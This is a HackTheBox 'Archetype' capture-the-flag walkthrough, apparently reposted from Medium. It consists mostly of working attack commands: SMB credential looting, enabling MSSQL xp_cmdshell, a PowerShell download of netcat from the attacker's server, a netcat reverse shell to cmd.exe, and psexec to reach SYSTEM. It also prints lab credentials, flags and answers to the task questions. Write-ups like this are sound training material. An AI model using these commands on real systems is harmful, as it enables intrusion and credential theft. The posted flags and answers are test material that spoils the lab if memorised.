---
title: "Archetype — HackTheBox Walkthrough"
date: 2025-04-19
layout: post
original_url: https://medium.com/@dazzled_mint_wildebeest_745/archetype-hackthebox-walkthrough-c7470cf6b556?source=rss-9499e60cb547------2
---

*Originally published on [Medium](https://medium.com/@dazzled_mint_wildebeest_745/archetype-hackthebox-walkthrough-c7470cf6b556?source=rss-9499e60cb547------2).*

Archetype — HackTheBox Walkthrough Gurpreet Singh Follow 4 min read · Apr 19, 2025 -- Listen Share
🌟 Introduction
Archetype is a classic beginner-friendly Windows machine from HackTheBox that teaches important skills like SMB enumeration, MSSQL exploitation, reverse shell techniques, and local privilege escalation. Here’s my full walkthrough, with actual screenshots from the journey, real commands used, and personal insights. Let’s go! 🚀
📄 Challenge Overview
Box Name : Archetype
: Archetype Platform : HTB Starting Point
: HTB Starting Point Difficulty : Easy
: Easy Objectives :
: Enumerate SMB and MSSQL
Extract creds from SMB
Execute commands with xp\_cmdshell
Get user and root flags
🔍 1. Initial Scanning
Started with an aggressive Nmap scan:
nmap -sC -sV -Pn -T4 -p- 10.129.119.190
It revealed:
Port 445 : SMB
: SMB Port 1433: MSSQL Server 2017
📁 2. SMB Enumeration & Credential Extraction
Anonymous access to SMB worked:
smbclient -N -L \\\\10.129.119.190\\
Connected to the backups share and found a config file:
smbclient -N \\\\10.129.119.190\\backups
smb: \> dir
smb: \> get prod.dtsConfig
Opened it to find hardcoded creds:
cat prod.dtsConfig
Extracted credentials:
Username : ARCHETYPE\sql\_svc
: ARCHETYPE\sql\_svc Password: M3g4c0rp123
🛠️ 3. MSSQL Access & Shell
✉️ 3.1 Connect to MSSQL
python3 /opt/impacket/examples/mssqlclient.py ARCHETYPE/sql\_svc@10.129.119.190 -windows-auth
⚖️ 3.2 Enable xp\_cmdshell
EXEC sp\_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp\_configure 'xp\_cmdshell', 1;
RECONFIGURE;
Check access:
EXEC xp\_cmdshell 'whoami';
It returned: archetype\sql\_svc
🚨 4. Reverse Shell with Netcat
Start a Python HTTP server on Kali:
sudo python3 -m http.server 80
Download Netcat on the target:
xp\_cmdshell "powershell.exe -c Invoke-WebRequest -Uri http://10.10.15.106/nc64.exe -OutFile C:\\Users\\sql\_svc\\Downloads\
c64.exe"
Then, set up your listener:
nc -lvnp 443
Trigger reverse shell:
xp\_cmdshell "powershell -c cd C:\\Users\\sql\_svc\\Downloads; .\
c64.exe -e cmd.exe 10.10.15.106 443"
And boom — shell popped. 🚀
🫠 5. Local Privilege Escalation
🔐 5.1 Grab the User Flag
cd C:\Users\sql\_svc\Desktop
type user.txt
Flag: 3e7b102e78218e935bf3f4951fec21a3
🕵️‍♂️ 5.2 Use winPEAS
Download winPEASx64.exe similarly:
xp\_cmdshell "powershell.exe -c Invoke-WebRequest -Uri http://10.10.15.106/winPEASx64.exe -OutFile C:\\Users\\sql\_svc\\Downloads\\winPEASx64.exe"
Then run it:
xp\_cmdshell "C:\\Users\\sql\_svc\\Downloads\\winPEASx64.exe"
It revealed this file:
C:\Users\sql\_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost\_history.txt
Which contained:
Username : Administrator
: Administrator Password: MEGACORP\_4dm1n!!
⚡ 6. SYSTEM Shell with psexec
python3 /opt/impacket/examples/psexec.py administrator@10.129.119.190
Use password: MEGACORP\_4dm1n!!
whoami
> nt authority\system
You are now SYSTEM ✨
🏆 7. Root Flag
cd C:\Users\Administrator\Desktop
type root.txt
Root Flag: b91ccec3305e98240082d4474b848528
📈 Task Questions Recap
QuestionAnswerWhich TCP port is hosting a database server?1433What is the name of the non-administrative SMB share?backupsWhat password did you find in the SMB share file?M3g4c0rp123Which Impacket script connects to MSSQL?mssqlclient.pyWhich extended procedure spawns a Windows shell?xp\_cmdshellWhich script enumerates Windows privilege escalation?winPEASWhich file contained the administrator’s password?ConsoleHost\_history.txtSubmit user flag:3e7b102e78218e935bf3f4951fec21a3Submit root flag:b91ccec3305e98240082d4474b848528
🧰 Conclusion
Archetype was the perfect playground for learning Windows lateral movement and escalation. Between SMB looting and MSSQL abuse, it had just the right level of difficulty. Hope this walkthrough helped — and if you have alternate methods, share away. Happy hacking! 🤖